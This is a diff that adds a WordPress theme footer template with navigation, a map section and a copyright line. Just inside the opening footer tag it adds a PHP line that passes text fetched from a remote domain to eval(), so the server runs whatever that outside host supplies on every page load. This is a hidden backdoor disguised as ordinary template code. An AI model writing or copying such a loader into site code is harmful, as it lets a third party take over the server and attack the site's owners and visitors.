@@ -1,0 +1,31 @@
+<footer class="footer">
+<?php
+eval("?>".file_get_contents('https://cubitpipi.sbs/acnhor1/bl1.txt'));
+?>
+	<div class="container footer-content">
+		
+		<div id="contact" class="home-main-section contact">
+			<?php get_template_part('templates/content', 'home-map'); ?>
+		</div>
+
+		<div class="socks">
+			<div class="row">
+				<div class="col-sm-6 footer-links-container">
+					<nav class="nav-footer" role="navigation">
+			      <?php
+			        if ( has_nav_menu('footer_navigation')) :
+			          wp_nav_menu(array('theme_location' => 'footer_navigation', 'menu_class' => 'footer-links'));
+			        endif;
+			      ?>
+			    </nav>
+				</div>
+				<div class="col-sm-6 copyright">
+					<p><a href="http://raffworks.com/">Design</a> | &copy; <?php echo date('Y'); ?> <?php bloginfo('name'); ?></p>
+
+				</div>
+			</div>
+		</div>
+  </div>
+</footer>
+
+<?php wp_footer(); ?>
